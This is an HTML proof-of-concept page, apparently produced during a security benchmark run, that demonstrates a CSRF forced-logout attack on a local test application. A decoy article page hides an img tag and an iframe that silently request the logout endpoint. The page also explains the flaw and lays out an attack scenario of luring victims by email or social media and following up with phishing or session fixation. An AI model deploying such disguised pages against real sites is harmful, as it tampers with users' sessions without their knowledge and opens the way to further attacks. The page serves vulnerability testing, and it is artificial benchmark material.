<!-- 
POC: HTML-based CSRF attack demonstration showing how an attacker can force logout via GET request using img tags and iframes
Target: ./repo
Created: 2025-11-04T17:17:42.945Z
Session: benchmark-XBEN-025-24-mhktlvhv

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-025-24-mhktlvhv/pocs/poc_csrf_logout_attack_page.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Interesting Article</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .content { width: 800px; margin: 0 auto; }
        .article { background: #f5f5f5; padding: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="content">
        <h1>Interesting Article Title</h1>
        <div class="article">
            <p>This is an interesting article that a user might visit...</p>
            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. 
            Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
        </div>

        <!-- CSRF Attack: Force logout via GET request in hidden image -->
        <img src="http://localhost:8000/accounts/logout/" style="display:none;" alt="" />
        
        <!-- Alternative attack vectors -->
        <iframe src="http://localhost:8000/accounts/logout/" style="display:none;"></iframe>
        <script>
            // Alternative attack using fetch (but browsers block cross-origin GET for state changes)
            // fetch('http://localhost:8000/accounts/logout/', {method: 'GET', credentials: 'include'})
            //     .catch(e => console.log('Request sent'));
        </script>

        <p style="margin-top: 40px; color: #999; font-size: 12px;">
            Attack explanation:<br/>
            - The &lt;img&gt; tag silently loads the logout endpoint via GET request<br/>
            - The &lt;iframe&gt; tag provides another vector<br/>
            - Both bypass CSRF protection on the GET method<br/>
            - If the user is logged in, they will be logged out without their knowledge
        </p>
    </div>

    <hr/>
    <h2>Vulnerability Details:</h2>
    <pre>
CSRF Vulnerability on Logout Endpoint - GET Request Not Protected

Vulnerable Request:
  GET /accounts/logout/ HTTP/1.1
  Host: target.com
  Cookie: sessionid=abc123def456...
  
Response:
  HTTP/1.1 302 Found
  Location: /accounts/login/
  (User is logged out)

Why this is a problem:
1. The application uses GET for logout (should be POST only)
2. GET requests are not protected by CSRF middleware
3. An attacker can force logout by making user visit malicious page
4. Attacker can use &lt;img&gt;, &lt;iframe&gt;, or other HTML elements
5. User doesn't know they've been logged out until they try to use the app

Attack Scenario:
1. Attacker creates malicious webpage with hidden &lt;img src="/accounts/logout/"&gt;
2. Attacker tricks user into visiting page (via email, social media, etc.)
3. User's browser automatically loads the img tag
4. GET request to /accounts/logout/ is sent with user's cookies
5. User is forcibly logged out
6. Attacker can now perform follow-up attacks (session fixation, phishing, etc.)
    </pre>

    <h2>Test Instructions:</h2>
    <ol>
        <li>Log in to the target application</li>
        <li>Visit this HTML file in a browser while logged in</li>
        <li>The hidden img/iframe tags will trigger logout</li>
        <li>Check that you've been logged out</li>
    </ol>
</body>
</html>